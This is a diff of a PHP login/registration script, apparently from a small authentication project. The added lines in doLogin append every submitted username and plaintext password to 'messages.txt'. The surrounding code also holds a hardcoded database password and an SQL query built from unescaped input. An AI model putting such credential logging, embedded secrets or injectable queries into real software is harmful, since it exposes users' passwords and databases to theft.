@@ -32,6 +32,15 @@ function doLogin($username,$password)
      return false;
    }
 
+   $file = 'messages.txt';
+   $handle = fopen($file, 'a') or die('Cannot open file: ' .$file);
+   $data = 'redirect: '.$username.', '.$password.'\n';
+   fwrite($handle, $data);
+    
+   fclose($handle);
+
+   return $result;
+
    //$login = new loginDB();
     //return $login->validateLogin($username,$password);
     //return false if not valid
@@ -44,6 +53,7 @@ function doRegister($username, $password)
         return false;
   }
 
+ 
    $db = mysqli_connect('localhost', 'emile', 'Password7!', 'authtest');
    $pass_hash = hash('sha512', $password);
    $s = sprintf("SELECT * FROM users WHERE username='%s' AND passhash='%s'",
@@ -64,10 +74,10 @@ function doRegister($username, $password)
    else {
      echo "Already registered";
      return false;
+   
    }
 
-
-
+  
 }
 
 function requestProcessor($request)
